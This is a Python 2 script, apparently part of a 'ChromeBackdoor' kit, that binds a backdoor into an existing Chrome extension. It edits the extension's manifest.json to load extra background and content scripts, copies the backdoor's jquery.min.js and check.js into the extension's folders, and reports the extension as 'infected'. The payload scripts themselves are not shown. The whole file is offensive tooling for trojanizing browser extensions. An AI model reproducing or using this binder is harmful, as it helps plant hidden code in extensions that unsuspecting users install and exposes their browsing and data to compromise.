#!usr/bin/env python

# Graniet - ChromeBackdoor Extension Binder

import urllib2
import time
import os
import sys
import json

class bcolors:
    
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

    
def Bind(backdoor, extension):
    writed = 0
    if(os.path.isfile(backdoor + "/lib/jquery.min.js") == False):
        print "[" + bcolors.OKBLUE + "-" + bcolors.ENDC + "] ChromeBackdoor is not original"
        sys.exit()
    if(os.path.isfile(backdoor + "/js/check.js") == False):
        print "[" + bcolors.OKBLUE + "-" + bcolors.ENDC + "] ChromeBackdoor is not original"
        sys.exit()
    backdoor_jquery = open(backdoor + "/lib/jquery.min.js").read()
    backdoor_injfect = open(backdoor + "/js/check.js").read()
    print "[" + bcolors.OKGREEN + "-" + bcolors.ENDC + "] Start bind ..."
    manifest_backdoor = extension + "/manifest.json"
    if(os.path.isfile(manifest_backdoor)):
        print "[" + bcolors.OKGREEN + "-" + bcolors.ENDC + "] Manifest found"
        try:
            print "[" + bcolors.OKGREEN + "-" + bcolors.ENDC + "] Open Backdoor manifest."
            fileOpen = open('manifest.json', 'wb')
            print "[" + bcolors.OKGREEN + "-" + bcolors.ENDC + "] Write new manifest."
            ExtensionManifest_source = open(manifest_backdoor).read()
            with open(manifest_backdoor) as data_file:
                data = json.load(data_file)
            data['background']['scripts'].append('lib/jquery.min.js')
            data['background']['scripts'].append('js/call.js')
            data['content_scripts'][0]['js'].append('lib/jquery.min.js')
            data['content_scripts'][0]['js'].append('js/check.js')
            json.dump(data, fileOpen)
            Source_Manifest_Backdoor = open('manifest.json').read()
            Manifest_Original = open(manifest_backdoor, 'wb')
            json.dump(data, Manifest_Original)
            print "[" + bcolors.OKGREEN + "-" + bcolors.ENDC + "] Manifest Write!"
            writed = 1
        except:
            print "[" + bcolors.OKBLUE + "-" + bcolors.ENDC + "] Can't create manifest."
        if(writed == 1):
            try:
                if(os.path.isdir(extension + "/js/") == False):
                    os.makedirs(extension + "/js/")
                    if(os.path.isdir(extension + "/lib/") == False):
                        os.makedirs(extension + "/lib/")
                print "[" + bcolors.OKGREEN + "-" + bcolors.ENDC + "] Dir is create!"
                try:
                    backdoor_jquery = open(backdoor + "/lib/jquery.min.js").read()
                    new_jquery = open(extension + "/lib/jquery.min.js", 'w')
                    new_jquery.write(backdoor_jquery)
                    
                    backdoor_check = open(backdoor + "/js/check.js").read()
                    new_check = open(extension + "/js/check.js", 'w')
                    new_check.write(backdoor_check)
                    
                    new_call = open(extension + "/js/call.js",'w')
                    print "[" + bcolors.OKGREEN + "-" + bcolors.ENDC + "] Extension infected please remove _metadata !"
                    print "infected pwd : " + extension
                except:
                    print "[" + bcolors.OKBLUE + "-" + bcolors.ENDC + "] Can't paste."
            except:
                print "[" + bcolors.OKBLUE + "-" + bcolors.ENDC + "] Can't make dir."
        
    else:
        print "[" + bcolors.OKBLUE + "-" + bcolors.ENDC + "] Manifest not found"
    
def main():
    if(len(sys.argv) > 2):
        ChromeBackdoor = sys.argv[1]
        BindEtension = sys.argv[2]
        Bind(ChromeBackdoor, BindEtension)
    else:
        print   "Usage : " + sys.argv[0] +" chromebackdoorPATH ExtensionBinded"

main()